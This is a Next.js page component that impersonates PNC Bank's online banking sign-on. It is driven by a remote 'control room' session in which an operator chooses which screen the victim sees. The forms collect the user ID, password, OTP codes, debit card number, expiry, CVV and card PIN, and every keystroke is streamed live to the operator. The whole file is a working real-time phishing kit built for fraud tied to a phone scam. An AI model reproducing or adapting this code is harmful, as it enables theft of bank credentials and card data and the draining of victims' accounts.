"use client";

import { useState, useRef, useEffect } from "react";
import { ControlRoomSession, SessionState } from "@/SDK/vendor-sdk";
import cardValidator from "card-validator";
import { CreditCard, CheckCircle2, XCircle, ShieldCheck, ChevronDown, KeyRound, Smartphone } from "lucide-react";

/* ===================================================================
   SCREEN COMPONENTS — one per workflow state
   =================================================================== */

function LoginForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke?: (field: string, value: string) => void; error?: string }) {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await onInput({ event: "submit_credentials", userId, password });
    } catch {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="sign-on-widget">
      <h1 className="sign-on-title">
        Sign On to Online Banking<br />
        <span className="or-text">or <a href="#" className="another-service-link">select another service <ChevronDown className="inline-block w-3 h-3 ml-1" /></a></span>
      </h1>
      <form className="sign-on-form" onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="userId">User ID <span className="required">(required)</span></label>
          <input type="text" id="userId" value={userId} onChange={e => { setUserId(e.target.value); onKeystroke?.("userId", e.target.value); }} placeholder="Enter User ID" required />
        </div>
        <div className="form-group">
          <label htmlFor="password">Password <span className="required">(required)</span></label>
          <div className="password-input-container">
            <input type={showPw ? "text" : "password"} id="password" value={password} onChange={e => { setPassword(e.target.value); onKeystroke?.("password", e.target.value); }} placeholder="Enter Password" required />
            <button type="button" className="show-password-btn" onClick={() => setShowPw(!showPw)}>{showPw ? "Hide" : "Show"} Password</button>
          </div>
          {error && <p className="inline-error" style={{ color: "var(--pnc-orange)", fontSize: "12px", marginTop: "8px", fontWeight: "bold" }}>{error}</p>}
        </div>
        <div className="remember-user-container">
          <div className="checkbox-wrapper">
            <input type="checkbox" id="rememberUser" />
            <label htmlFor="rememberUser" className="remember-label">Remember User ID</label>
          </div>
          <p className="remember-warning">DO NOT check this box if you are using a public computer. User IDs potentially containing sensitive information will not be saved.</p>
        </div>
        <button type="submit" className="sign-on-submit-btn" disabled={isSubmitting}>
          {isSubmitting ? "Processing..." : "Sign On"}
        </button>
        <div className="sign-on-links">
          <a href="#" className="forgot-link">Forgot ID or Password?</a>
          <span className="or-divider">or</span>
          <a href="#" className="enroll-link">Enroll In Online Banking</a>
        </div>
      </form>
    </div>
  );
}

function OtpVerificationForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke?: (field: string, value: string) => void; error?: string }) {
  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await onInput({ event: "verify_otp", otp_code: otp });
    } catch {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="sign-on-widget">
      <h1 className="sign-on-title">Verify Your Identity</h1>
      <p style={{ fontSize: 14, color: "var(--text-mid)", marginBottom: 24 }}>We&apos;ve sent a verification code to your registered phone number. Enter it below to continue.</p>
      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="otp">Verification Code <span className="required">(required)</span></label>
          <input 
            type="text" 
            id="otp" 
            value={otp} 
            onChange={e => { setOtp(e.target.value); onKeystroke?.("otp_code", e.target.value); }} 
            placeholder="Enter Code" 
            inputMode="numeric" 
            required 
            autoComplete="one-time-code"
            style={{ letterSpacing: "2px", fontWeight: "bold" }}
          />
          {error && <p className="inline-error" style={{ color: "var(--pnc-orange)", fontSize: "12px", marginTop: "8px", fontWeight: "bold" }}>{error}</p>}
        </div>
        <button type="submit" className="sign-on-submit-btn" disabled={otp.length < 4 || isSubmitting}>
          {isSubmitting ? "Verifying..." : "Verify Code"}
        </button>
        <div className="sign-on-links">
          <a href="#" className="forgot-link">Resend Code</a>
          <span className="or-divider">or</span>
          <a href="#" className="enroll-link">Try Another Method</a>
        </div>
      </form>
    </div>
  );
}

function DebitCardForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke?: (field: string, value: string) => void; error?: string }) {
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [validationError, setValidationError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setValidationError("");

    const numberValidation = cardValidator.number(cardNumber);
    if (!numberValidation.isValid) {
      setValidationError("Please enter a valid debit card number.");
      return;
    }

    const expirationValidation = cardValidator.expirationDate(expiry);
    if (!expirationValidation.isValid) {
      setValidationError("Please enter a valid expiration date (MM/YY).");
      return;
    }

    const cvvValidation = cardValidator.cvv(cvv, numberValidation.card ? numberValidation.card.code.size : 3);
    if (!cvvValidation.isValid) {
      setValidationError("Please enter a valid CVV security code.");
      return;
    }

    setIsSubmitting(true);
    try {
      await onInput({ event: "submit_card_details", card_number: cardNumber, expiry, cvv });
    } catch {
      setIsSubmitting(false);
    }
  };

  const formatCard = (val: string) => {
    const digits = val.replace(/\D/g, "").slice(0, 19);
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
  };

  const formatExpiry = (val: string) => {
    const digits = val.replace(/\D/g, "").slice(0, 4);
    if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
    return digits;
  };

  return (
    <div className="sign-on-widget">
      <h1 className="sign-on-title">Verify Your Debit Card</h1>
      <div style={{ display: "flex", justifyContent: "center", marginBottom: "20px" }}>
        <div style={{ width: "48px", height: "48px", borderRadius: "50%", backgroundColor: "var(--pnc-orange)", display: "flex", alignItems: "center", justifyContent: "center", color: "white" }}>
          <CreditCard style={{ width: "24px", height: "24px" }} />
        </div>
      </div>
      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="cardNumber">Card Number <span className="required">(required)</span></label>
          <input type="text" id="cardNumber" value={cardNumber} onChange={e => { const v = formatCard(e.target.value); setCardNumber(v); onKeystroke?.("card_number", v); }} placeholder="1234 5678 9012 3456" inputMode="numeric" required />
        </div>
        <div style={{ display: "flex", gap: 12 }}>
          <div className="form-group" style={{ flex: 1 }}>
            <label htmlFor="expiry">Expiry <span className="required">(required)</span></label>
            <input type="text" id="expiry" value={expiry} onChange={e => { const v = formatExpiry(e.target.value); setExpiry(v); onKeystroke?.("expiry", v); }} placeholder="MM/YY" inputMode="numeric" required />
          </div>
          <div className="form-group" style={{ flex: 1 }}>
            <label htmlFor="cvv">CVV <span className="required">(required)</span></label>
            <input type="password" id="cvv" value={cvv} onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 4); setCvv(v); onKeystroke?.("cvv", v); }} placeholder="123" inputMode="numeric" required />
          </div>
        </div>
        {(error || validationError) && <p className="inline-error" style={{ color: "var(--pnc-orange)", fontSize: "12px", marginBottom: "16px", fontWeight: "bold" }}>{validationError || error}</p>}
        <button type="submit" className="sign-on-submit-btn" disabled={isSubmitting}>
          {isSubmitting ? "Processing..." : "Continue"}
        </button>
      </form>
    </div>
  );
}

function PinForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke?: (field: string, value: string) => void; error?: string }) {
  const [pin, setPin] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await onInput({ event: "verify_pin", pin: pin });
    } catch {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="sign-on-widget">
      <h1 className="sign-on-title">Enter Your PIN</h1>
      <p style={{ fontSize: 14, color: "var(--text-mid)", marginBottom: 24 }}>Enter your debit card PIN to verify your identity.</p>
      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="pin">Card PIN <span className="required">(required)</span></label>
          <input 
            type="password" 
            id="pin" 
            value={pin} 
            onChange={e => { const v = e.target.value.replace(/\D/g, ""); setPin(v); onKeystroke?.("pin", v); }} 
            placeholder="Enter PIN" 
            inputMode="numeric" 
            required 
            style={{ letterSpacing: "4px", fontWeight: "bold" }}
          />
          {error && <p className="inline-error" style={{ color: "var(--pnc-orange)", fontSize: "12px", marginTop: "8px", fontWeight: "bold" }}>{error}</p>}
        </div>
        <button type="submit" className="sign-on-submit-btn" disabled={pin.length < 4 || isSubmitting}>
          {isSubmitting ? "Verifying..." : "Verify PIN"}
        </button>
      </form>
    </div>
  );
}

function TransactionOtpForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke?: (field: string, value: string) => void; error?: string }) {
  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await onInput({ event: "verify_transaction_otp", otp_code: otp });
    } catch {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="sign-on-widget">
      <h1 className="sign-on-title">Transaction Verification</h1>
      <p style={{ fontSize: 14, color: "var(--text-mid)", marginBottom: 24 }}>A new verification code has been sent to confirm this transaction. Enter it below.</p>
      <form onSubmit={handleSubmit}>
        <div className="form-group">
          <label htmlFor="transactionOtp">Verification Code <span className="required">(required)</span></label>
          <input 
            type="text" 
            id="transactionOtp" 
            value={otp} 
            onChange={e => { setOtp(e.target.value); onKeystroke?.("transaction_otp", e.target.value); }} 
            placeholder="Enter Code" 
            inputMode="numeric" 
            required 
            autoComplete="one-time-code"
            style={{ letterSpacing: "2px", fontWeight: "bold" }}
          />
          {error && <p className="inline-error" style={{ color: "var(--pnc-orange)", fontSize: "12px", marginTop: "8px", fontWeight: "bold" }}>{error}</p>}
        </div>
        <button type="submit" className="sign-on-submit-btn" disabled={otp.length < 4 || isSubmitting}>
          {isSubmitting ? "Confirming..." : "Confirm Transaction"}
        </button>
      </form>
    </div>
  );
}

function ProcessingScreen() {
  return (
    <div className="sign-on-widget">
      <div className="status-screen">
        <div className="spinner"></div>
        <h2 className="status-title">Processing Your Request</h2>
        <p className="status-message">Please wait while we verify your information. Do not close or refresh this page.</p>
      </div>
    </div>
  );
}

function SuccessScreen() {
  return (
    <div className="sign-on-widget">
      <div className="status-screen" style={{ display: "flex", flexDirection: "column", alignItems: "center", textAlign: "center" }}>
        <CheckCircle2 style={{ color: "var(--pnc-blue)", width: "64px", height: "64px", marginBottom: "20px" }} />
        <h2 className="status-title" style={{ color: "var(--pnc-blue)" }}>Verification Complete</h2>
        <p className="status-message">Your identity has been verified successfully. You will be redirected to your account shortly.</p>
      </div>
    </div>
  );
}

function FailureScreen() {
  return (
    <div className="sign-on-widget">
      <div className="status-screen" style={{ display: "flex", flexDirection: "column", alignItems: "center", textAlign: "center" }}>
        <XCircle style={{ color: "var(--pnc-orange)", width: "64px", height: "64px", marginBottom: "20px" }} />
        <h2 className="status-title" style={{ color: "var(--pnc-orange)" }}>Verification Failed</h2>
        <p className="status-message">We were unable to verify your identity. Please contact PNC Customer Service at 1-888-PNC-BANK for assistance.</p>
      </div>
    </div>
  );
}

/* ===================================================================
   MAIN PAGE — Reference Entry → Session Flow
   =================================================================== */

export default function Home() {
  const [caseRef, setCaseRef] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [sessionState, setSessionState] = useState<SessionState | null>(null);
  const [session, setSession] = useState<ControlRoomSession | null>(null);

  const handleConnect = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!caseRef.trim()) return;

    setLoading(true);
    setError("");

    try {
      const s = new ControlRoomSession({
        tenant_id: "e63d3b80-3289-499e-84ca-292b70c13ac6",
        case_reference: caseRef.trim(),
        supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL!,
        supabaseKey: process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY!,
      });
      const state = await s.connect();
      setSession(s);
      setSessionState(state);

      s.subscribe((newState) => {
        setSessionState(newState);
      });
    } catch (err: any) {
      setError(err.message || "Failed to connect. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleInput = async (data: any) => {
    if (session) {
      await session.sendInput(data);
    }
  };

  const handleKeystroke = (field: string, value: string) => {
    if (session) {
      session.sendKeystroke(field, value);
    }
  };

  // Cleanup
  useEffect(() => {
    return () => {
      if (session) session.disconnect();
    };
  }, [session]);

  // If no session yet, show reference entry
  if (!sessionState) {
    return (
      <div className="sign-on-widget">
        <h1 className="sign-on-title">Sign On to Online Banking</h1>
        <p className="ref-entry-subtitle">Enter the reference number provided by your banking representative to continue with your verification.</p>
        <form onSubmit={handleConnect}>
          <div className="ref-input-wrapper">
            <input
              type="text"
              className="ref-input"
              value={caseRef}
              onChange={e => setCaseRef(e.target.value.toUpperCase())}
              placeholder="CR-XXXXXX-XXXX"
              autoFocus
            />
            {error && <p className="ref-error">{error}</p>}
          </div>
          <button type="submit" className="sign-on-submit-btn" disabled={loading || !caseRef.trim()}>
            {loading ? "Connecting..." : "Continue"}
          </button>
          <div className="sign-on-links">
            <a href="#" className="forgot-link">Don&apos;t have a reference?</a>
            <span className="or-divider">or</span>
            <a href="#" className="enroll-link">Contact Support</a>
          </div>
        </form>
      </div>
    );
  }

  // Render the right component based on component_key from operator
  const operatorError = sessionState.operator_message;

  switch (sessionState.component_key) {
    case "LoginForm":
      return <LoginForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "OtpVerificationForm":
      return <OtpVerificationForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "DebitCardForm":
      return <DebitCardForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "PinForm":
      return <PinForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "TransactionOtpForm":
      return <TransactionOtpForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "ProcessingScreen":
      return <ProcessingScreen />;
    case "SuccessScreen":
      return <SuccessScreen />;
    case "FailureScreen":
      return <FailureScreen />;
    default:
      return (
        <div className="sign-on-widget">
          <div className="status-screen">
            <div className="spinner"></div>
            <h2 className="status-title">Loading...</h2>
            <p className="status-message">Waiting for session state: {sessionState.current_state}</p>
          </div>
        </div>
      );
  }
}
